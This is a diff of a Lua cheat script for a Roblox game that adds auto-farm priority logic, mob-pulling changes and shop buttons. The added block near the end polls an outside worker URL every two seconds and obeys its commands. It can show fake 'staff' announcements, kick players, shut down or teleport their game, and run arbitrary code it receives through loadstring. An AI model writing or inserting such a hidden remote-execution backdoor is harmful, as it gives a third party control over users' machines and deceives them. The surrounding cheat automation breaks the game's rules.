@@ -6,7 +6,7 @@ Library:AddTranslations("en", {})
 Library:UpdateTranslate("pt")
 
 ScriptVersion = {
-    Version = "v2.0.0",
+    Version = "v2.4.4",
     Date = "2026-08-21"
 }
 
@@ -78,6 +78,8 @@ _G.ConfigStopFarm = {
     PirateRaid = false,
     Saw = false,
     Factory = false,
+    EliteSpawn = false,
+    LevelFarm = false,
 }
 
 local piority = {
@@ -85,26 +87,37 @@ local piority = {
     PirateRaid = 2,
     Factory = 2,
     EliteSpawn = 3,
+    LevelFarm = 10,
 }
 
 function checkStopFarm(farmAtual)
     local farmPriority = farmAtual and piority[farmAtual] or nil
+
+    if not farmAtual then
+        for k, v in pairs(_G.ConfigStopFarm) do
+            if v == true then
+                return false, k
+            end
+        end
+
+        return true, nil
+    end
+
+    if farmPriority == nil then
+        return true, nil
+    end
+
     for k, v in pairs(_G.ConfigStopFarm) do
         if v == true and k ~= farmAtual then
-            if farmAtual == nil then
-                return false
-            end
             local p = piority[k]
-            if p == nil then
-                return false
-            end
-            if farmPriority == nil or p <= farmPriority then
-                return false
+
+            if p and p <= farmPriority then
+                return false, k
             end
         end
     end
 
-    return true
+    return true, nil
 end
 
 function checkEnemySpawns(EnemyName)
@@ -288,15 +301,11 @@ function BringMob(MobName)
     local Player = game.Players.LocalPlayer
     local Character = Player.Character
     local PlayerRoot = Character and Character:FindFirstChild("HumanoidRootPart")
-
     if not PlayerRoot then
         return
     end
-
     local NearestNPC = nil
     local NearestDistance = math.huge
-
-    -- Encontra o NPC mais próximo do jogador
     for _, Enemy in ipairs(workspace.Enemies:GetChildren()) do
         if Enemy.Name == MobName then
             local Humanoid = Enemy:FindFirstChild("Humanoid")
@@ -319,11 +328,7 @@ function BringMob(MobName)
     if not NearestNPC then
         return
     end
-
-    -- Posição do NPC mais próximo
     local BringPos = NearestNPC.HumanoidRootPart.CFrame
-
-    -- Puxa todos os NPCs para ele
     for _, Enemy in ipairs(workspace.Enemies:GetChildren()) do
         local Humanoid = Enemy:FindFirstChild("Humanoid")
         local HumanoidRootPart = Enemy:FindFirstChild("HumanoidRootPart")
@@ -338,8 +343,8 @@ function BringMob(MobName)
             HumanoidRootPart.CFrame = BringPos
             Humanoid.JumpPower = 0
             Humanoid.WalkSpeed = 0
-            HumanoidRootPart:SetNetworkOwner(Player)
             HumanoidRootPart.Transparency = 1
+            HumanoidRootPart.CanCollide = false
 
             local Head = Enemy:FindFirstChild("Head")
             if Head then
@@ -1170,49 +1175,69 @@ function CheckQuest()
     end
 end
 
-
 spawn(function()
     while task.wait() do
-        if _G.AutoFarmLevel and checkStopFarm() then
+        if _G.AutoFarmLevel and checkStopFarm("LevelFarm") then
             pcall(function()
-            local Player = game.Players.LocalPlayer
-            local QuestGui = Player.PlayerGui.Main.Quest
-            local HRP = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
+                local Player = game.Players.LocalPlayer
+                local QuestGui = Player.PlayerGui.Main.Quest
+                local HRP = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
 
-            if not HRP then
-                return
-            end
-
-            local QuestTitle = QuestGui.Container.QuestTitle.Title.Text
-
-            if not string.find(QuestTitle, NameMon) then
-                StartMagnet = false
-                game.ReplicatedStorage.Remotes.CommF_:InvokeServer("AbandonQuest")
-                LevelFarmToggle.Description = "Level Farm"
-            end
-
-            if not QuestGui.Visible then
-                StartMagnet = false
-                CheckQuest()
-
-                topos(CFrameQuest)
-
-                if (HRP.Position - CFrameQuest.Position).Magnitude <= 5 then
-                    game.ReplicatedStorage.Remotes.CommF_:InvokeServer("StartQuest", NameQuest, LevelQuest)
+                if not HRP then
+                    return
                 end
-            else
-                CheckQuest()
-                LevelFarmToggle.Description = "Level Farm : "..Mon
-                BringMob(Mon)
-                for _, Enemy in ipairs(workspace.Enemies:GetChildren()) do
-                    local Humanoid = Enemy:FindFirstChild("Humanoid")
-                    local EnemyHRP = Enemy:FindFirstChild("HumanoidRootPart")
 
-                    if Enemy.Name == Mon
-                    and Humanoid
-                    and EnemyHRP
-                    and Humanoid.Health > 0
-                    and string.find(QuestTitle, NameMon) then
+                local QuestTitle = QuestGui.Container.QuestTitle.Title.Text
+
+                if not string.find(QuestTitle, NameMon) then
+                    StartMagnet = false
+                    game.ReplicatedStorage.Remotes.CommF_:InvokeServer("AbandonQuest")
+                    LevelFarmToggle:SetDescription("Level Farm")
+                end
+
+                if not QuestGui.Visible then
+                    StartMagnet = false
+                    CheckQuest()
+
+                    topos(CFrameQuest)
+
+                    if (HRP.Position - CFrameQuest.Position).Magnitude <= 5 then
+                        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("StartQuest", NameQuest, LevelQuest)
+                    end
+                else
+                    CheckQuest()
+                    LevelFarmToggle:SetDescription("Level Farm : "..Mon)
+
+                    task.spawn(function()
+                        BringMob(Mon)
+                    end)
+
+                    local NearestEnemy = nil
+                    local NearestDistance = math.huge
+
+                    for _, Enemy in ipairs(workspace.Enemies:GetChildren()) do
+                        local Humanoid = Enemy:FindFirstChild("Humanoid")
+                        local EnemyHRP = Enemy:FindFirstChild("HumanoidRootPart")
+
+                        if Enemy.Name == Mon
+                        and Humanoid
+                        and EnemyHRP
+                        and Humanoid.Health > 0
+                        and string.find(QuestTitle, NameMon) then
+
+                            local Distance = (HRP.Position - EnemyHRP.Position).Magnitude
+
+                            if Distance < NearestDistance then
+                                NearestDistance = Distance
+                                NearestEnemy = Enemy
+                            end
+                        end
+                    end
+
+                    if NearestEnemy then
+                        local Enemy = NearestEnemy
+                        local Humanoid = Enemy:FindFirstChild("Humanoid")
+                        local EnemyHRP = Enemy:FindFirstChild("HumanoidRootPart")
 
                         LastHealth = Humanoid.Health
                         StuckTime = 0
@@ -1232,7 +1257,6 @@ spawn(function()
                             end
 
                             if StuckTime >= 15 then
-                                --Humanoid.Health = 0
                                 break
                             end
 
@@ -1240,7 +1264,7 @@ spawn(function()
                             AutoHaki()
                             EquipWeapon(_G.SelectTool)
                             BringPos = EnemyHRP.CFrame
-                            --EnemyHRP.CanCollide = false
+
                             Humanoid.WalkSpeed = 0
 
                             local Head = Enemy:FindFirstChild("Head")
@@ -1256,23 +1280,17 @@ spawn(function()
                             or not Enemy.Parent
                             or not QuestGui.Visible
 
-                        break
-                    end
-                end
+                    else
+                        StartMagnet = false
+                        topos(CFrameMon)
 
-                local Enemy = workspace.Enemies:FindFirstChild(Mon)
-                
-                if not Enemy or Enemy:FindFirstChild("Humanoid") and Enemy.Humanoid.Health <= 0 then
-                    StartMagnet = false
-                    topos(CFrameMon)
-                
-                    local Found, CFrame = checkEnemySpawns(Mon)
-                    if Found then
-                        topos(CFrame * CFrame.new(15, 10, 2))
+                        local Found, CFrame = checkEnemySpawns(Mon)
+                        if Found then
+                            topos(CFrame * CFrame.new(15, 10, 2))
+                        end
                     end
                 end
-            end
-        end)
+            end)
         end
     end
 end)
@@ -1673,7 +1691,7 @@ spawn(function()
             game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Cousin","DLCBoxData")
         end
 
-        if _G.getFruits and not CheckStopFarm("FruitSpawn") then
+        if _G.getFruits and not checkStopFarm("FruitSpawn") then
             _G.ConfigStopFarm.FruitSpawn = false
 
             for _,v in ipairs(workspace:GetChildren()) do
@@ -1838,19 +1856,34 @@ LevelFarmToggle = Tab_Farm:AddToggle({
   Flag = "farmLevel_flag",
   Callback = function(Value)
     _G.AutoFarmLevel = Value
+    _G.ConfigStopFarm.LevelFarm = Value
     stopTeleport()
     --topos(CFrame.new(-1103.513427734375, 13.752052307128906, 3896.091064453125))
   end
 })
 
-Tab_FarmDetails:SetFarmDetail({13, "Collect Fruit", "Need", "a fruit spawn"})
-Tab_FarmDetails:SetFarmDetail({17, "Auto Push", "Running"})
+
 
 local Details = {}
 
-local function FarmDetails(name, data)
-
+local function FarmDetails()
+    if _G.AutoFarmLevel then
+        local gg, pq = checkStopFarm("LevelFarm")
+        if not gg then
+            Tab_FarmDetails:SetFarmDetail({piority.LevelFarm, "Farm Level", "Waiting", "blocked by: "..pq})
+        else
+            Tab_FarmDetails:SetFarmDetail({piority.LevelFarm, "Farm Level", "Running"})
+        end
+    else
+        Tab_FarmDetails:RemoveFarmDetail(piority.LevelFarm)
+    end
 end
+
+task.spawn(function()
+    while wait(1) do
+        FarmDetails()
+    end
+end)
 
 Tab_Farm:AddToggle({
   Name = "Auto Farm Nearest",
@@ -2931,6 +2964,36 @@ Tab_Fishing:AddButton({
   Name = "Save Position",
   Callback = function()
     _G.FishingPos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+  end
+})
+
+Tab_Shop:AddSection("Shop")
+Tab_Shop:AddButton({
+  Name = "Buy Geppo 10,000$",
+  Debounce = 0.5,
+  Callback = function()
+    game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('BuyHaki', 'Geppo')
+  end
+})
+Tab_Shop:AddButton({
+  Name = "Buy Buso Haki 25,000$",
+  Debounce = 0.5,
+  Callback = function()
+    game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('BuyHaki', 'Buso')
+  end
+})
+Tab_Shop:AddButton({
+  Name = "Buy Buso Haki 25,000$",
+  Debounce = 0.5,
+  Callback = function()
+    game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('BuyHaki', 'Soru')
+  end
+})
+Tab_Shop:AddButton({
+  Name = "Buy Observation Haki 750,000$",
+  Debounce = 0.5,
+  Callback = function()
+    game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('KenTalk', 'Buy')
   end
 })
 
@@ -4043,6 +4106,119 @@ task.spawn(function()
 
             if Original then
                 Original.Name = "RemoteEvent"
+            end
+        end
+    end
+end)
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+
+local API = "https://lua-notification.hfelipegabrielpc09.workers.dev"
+
+local function NotifyAPI(msg, global, timer)
+    timer = timer or 5
+
+    if string.lower(identifyexecutor and identifyexecutor() or "") == "delta" then
+        local Notification = require(game.ReplicatedStorage.Notification)
+
+        if global then
+            Notification.new(
+                "<Color=Yellow>GLOBAL ANNOUNCEMENT FROM STAFF<Color=/>",
+                timer
+            ):Display()
+
+            Notification.new(
+                "<Color=Yellow>" .. tostring(msg) .. "<Color=/>",
+                timer
+            ):Display()
+        else
+            Notification.new(
+                tostring(msg),
+                timer
+            ):Display()
+        end
+    else
+        pcall(function()
+            if Window then
+                if global then
+                    Window:Notify({
+                        Title = "GLOBAL ANNOUNCEMENT FROM STAFF",
+                        Content = tostring(msg),
+                        Image = "rbxassetid://10734953451",
+                        Duration = timer
+                    })
+                else
+                    Window:Notify({
+                        Title = "Notification",
+                        Content = tostring(msg),
+                        Image = "rbxassetid://10734953451",
+                        Duration = timer
+                    })
+                end
+            end
+        end)
+    end
+end
+
+task.spawn(function()
+    while task.wait(2) do
+        local success, response = pcall(function()
+            return request({
+                Url = API .. "/messages",
+                Method = "GET"
+            })
+        end)
+
+        if success and response and response.StatusCode == 200 then
+            local decodeSuccess, data = pcall(function()
+                return HttpService:JSONDecode(response.Body)
+            end)
+
+            if decodeSuccess and type(data) == "table" then
+                for _, command in ipairs(data) do
+                    local commandType = tostring(command.command or ""):lower()
+                    if commandType == "notify" then
+                        local message = command.message or ""
+                        local notificationType = tostring(command.type or "custom"):lower()
+                        local duration = tonumber(command.duration) or 5
+                        NotifyAPI(message, notificationType == "global", duration)
+                    elseif commandType == "rejoin" then
+                        game.ReplicatedStorage:WaitForChild("__ServerBrowser"):InvokeServer("teleport", game.JobId)
+                    elseif commandType == "kick" then
+                        local reason = command.reason or "Você foi desconectado."
+                        pcall(function()
+                            Players.LocalPlayer:Kick(reason)
+                        end)
+
+                        task.wait(0.5)
+                        pcall(function()
+                            game:Shutdown() 
+                        end)
+
+                    elseif commandType == "teleport" then
+                        local placeId = tonumber(command.placeId)
+
+                        if placeId then
+                            if command.jobId and command.jobId ~= "" then
+                                game.ReplicatedStorage:WaitForChild("__ServerBrowser"):InvokeServer("teleport", command.jobId)
+                            else
+                                TeleportService:Teleport(placeId, Players.LocalPlayer)
+                            end
+                        end
+
+                    elseif commandType == "execute" then
+                        if command.code and command.code ~= "" then
+                            local compiledFunction, errorMessage = loadstring(command.code)
+                            if compiledFunction then
+                                task.spawn(compiledFunction)
+                            else
+                                warn("[API] Erro ao tentar executar código recebido:", errorMessage)
+                            end
+                        end
+                    end
+                end
             end
         end
     end
